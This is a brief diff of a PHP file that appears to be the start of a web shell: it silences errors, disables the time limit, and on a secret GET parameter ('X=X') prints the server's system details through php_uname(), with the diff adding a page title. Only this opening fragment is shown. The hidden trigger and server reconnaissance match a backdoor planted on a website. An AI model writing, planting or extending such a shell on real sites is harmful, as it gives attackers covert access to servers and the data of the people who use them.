@@ -1,7 +1,7 @@
 <?php
 error_reporting(0);
 set_time_limit(0);
-
+echo '<title>X=X</title>';
 if($_GET['X']=="X"){
 echo "<center><b>Uname:".php_uname()."<br></b>"; 
 echo '<font color="black" size="4">';
